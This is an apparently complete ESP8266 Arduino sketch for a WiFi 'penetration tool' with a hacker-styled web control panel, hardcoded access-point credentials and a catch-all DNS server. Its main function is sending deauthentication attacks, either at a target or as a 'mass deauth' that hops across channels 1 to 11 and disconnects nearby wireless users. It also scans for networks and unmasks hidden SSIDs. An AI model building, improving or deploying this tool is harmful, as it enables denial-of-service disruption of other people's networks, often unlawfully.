/* * PROJECT: GMpro87 Professional Penetration Tool
 * SSID: GMpro | PASS: Sangkur87
 */

#include "Arduino.h"
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <LittleFS.h>

// SDK Deauther Core
#include <A_Config.h>
#include <Attack.h>
#include <Scan.h>

// --- KONFIGURASI GLOBAL ---
const char* apSSID = "GMpro";
const char* apPASS = "Sangkur87";
const int LED_PIN = 2;

AsyncWebServer server(80);
DNSServer dnsServer;
Attack attack;
Scan scanObj;

// Global State
bool massDeauth = false;
bool scanHidden = false;
int blinkInterval = 1000;
unsigned long lastHop = 0;
unsigned long prevBlink = 0;
int currentCh = 1;

// --- UI WEB (Disimpan di PROGMEM) ---
const char INDEX_HTML[] PROGMEM = R"raw(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background:#050505; color:#0f0; font-family:monospace; text-align:center; margin:0; }
        .header { background:#111; padding:20px; border-bottom:2px solid #0f0; box-shadow:0 0 15px #0f0; }
        .tabs { display:flex; background:#1a1a1a; position:sticky; top:0; }
        .tab { flex:1; padding:15px; cursor:pointer; border-bottom:2px solid #333; }
        .tab.active { background:#0f0; color:#000; font-weight:bold; }
        .content { display:none; padding:15px; }
        .content.active { display:block; }
        .btn { background:#111; border:1px solid #0f0; color:#0f0; padding:14px; width:100%; margin:8px 0; border-radius:5px; font-weight:bold; cursor:pointer; }
        .btn.on { background:#f00; border-color:#f00; color:#fff; box-shadow:0 0 15px #f00; }
        .wifi-row { display:grid; grid-template-columns: 2fr 1fr 1fr 1fr; background:#111; padding:10px; margin:5px 0; font-size:11px; border-left:3px solid #0f0; text-align:left;}
        .log-box { background:#000; border:1px solid #333; height:130px; overflow-y:scroll; padding:10px; text-align:left; font-size:11px; color:#0f0; margin-top:15px; }
    </style>
</head>
<body>
    <div class="header"><div>GMPRO87</div><small>ADMIN SECURE: ON CH 1</small></div>
    <div class="tabs">
        <div id="bt1" class="tab active" onclick="sh(1)">CONSOLE</div>
        <div id="bt2" class="tab" onclick="sh(2)">SETTING</div>
    </div>
    <div id="t1" class="content active">
        <button class="btn" onclick="sc()">SCAN & UNMASK HIDDEN</button>
        <div id="wl"></div>
        <hr style="border:0.5px solid #333">
        <button id="atk1" class="btn" onclick="tk('deauth','atk1')">DEAUTH TARGET</button>
        <button id="atk3" class="btn" onclick="tk('mass','atk3')">MASS DEAUTH RUSUH</button>
        <div class="log-box" id="lg">Sistem Siap...</div>
    </div>
    <div id="t2" class="content">
        <h3>Settings</h3>
        <button class="btn" id="h_btn" onclick="toggleHidden()">SCAN MODE: NORMAL</button>
    </div>
    <script>
        function sh(n){
            document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
            document.getElementById('t'+n).classList.add('active');
            document.getElementById('bt'+n).classList.add('active');
        }
        function tk(ty, id){
            let b=document.getElementById(id); b.classList.toggle('on');
            let s=b.classList.contains('on')?'START':'STOP';
            fetch('/cmd?type='+ty+'&do='+s);
            log("Sistem: "+ty+" "+s);
        }
        function toggleHidden(){
            let b=document.getElementById('h_btn');
            let m=(b.innerText=="SCAN MODE: NORMAL")?"on":"off";
            fetch('/hscan?m='+m);
            b.innerText=(m=="on")?"SCAN MODE: DEEP":"SCAN MODE: NORMAL";
            b.style.color=(m=="on")?"yellow":"#0f0";
        }
        function sc(){ log("Scanning..."); fetch('/scan').then(r=>r.text()).then(d=>{document.getElementById('wl').innerHTML=d;}); }
        function log(m){ let l=document.getElementById('lg'); l.innerHTML+="<br>> "+m; l.scrollTop=l.scrollHeight; }
    </script>
</body>
</html>
)raw";

void setup() {
    Serial.begin(115200);
    pinMode(LED_PIN, OUTPUT);
    
    if(!LittleFS.begin()) Serial.println("LittleFS Mount Failed");

    // --- INISIALISASI SDK ---
    scanObj.begin();
    attack.begin();

    // 1. WiFi Admin
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP(apSSID, apPASS, 1, 0); 
    dnsServer.start(53, "*", WiFi.softAPIP());

    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", INDEX_HTML);
    });

    // Perbaikan Capture Clause [=] agar bisa akses global object
    server.on("/scan", HTTP_GET, [=](AsyncWebServerRequest *request){
        scanObj.start(0); 
        String out = "<div class='wifi-row' style='background:#222'><div>SSID</div><div>CH</div><div>SIG</div><div>SEL</div></div>";
        for(int i=0; i<scanObj.count(); i++){
            String name = scanObj.getSSID(i);
            if(name == "" || name.length() == 0) name = "[HIDDEN]";
            out += "<div class='wifi-row'><div>" + name + "</div><div>" + String(scanObj.getChannel(i)) + "</div><div>" + String(scanObj.getRSSI(i)) + "</div><div><input type='checkbox'></div></div>";
        }
        request->send(200, "text/plain", out);
    });

    server.on("/hscan", HTTP_GET, [](AsyncWebServerRequest *request){
        if(request->hasParam("m")) scanHidden = (request->getParam("m")->value() == "on");
        request->send(200, "text/plain", "OK");
    });

    server.on("/cmd", HTTP_GET, [=](AsyncWebServerRequest *request){
        String type = request->getParam("type")->value();
        String action = request->getParam("do")->value();
        
        if(type == "mass") {
            massDeauth = (action == "START");
            if(!massDeauth) attack.stopAll();
            blinkInterval = massDeauth ? 80 : 1000;
        } else if(type == "deauth") {
            if(action == "START") {
                attack.start(true, false, false, false, 0); 
                blinkInterval = 150;
            } else {
                attack.stopAll();
                blinkInterval = 1000;
            }
        }
        request->send(200, "text/plain", "OK");
    });

    server.begin();
}

void loop() {
    dnsServer.processNextRequest();

    // 2. LOGIKA MASS DEAUTH + CHANNEL HOPPING
    if (massDeauth) {
        unsigned long now = millis();
        if (now - lastHop >= 200) { 
            lastHop = now;
            currentCh++;
            if (currentCh > 11) currentCh = 1;
            
            wifi_set_channel(currentCh);
            
            if (currentCh != 1) { 
                attack.start(true, false, false, false, 0); 
            }
        }
    }

    // 3. LOGIKA LED
    unsigned long cur = millis();
    if (cur - prevBlink >= (unsigned long)blinkInterval) {
        prevBlink = cur;
        digitalWrite(LED_PIN, !digitalRead(LED_PIN));
    }
}
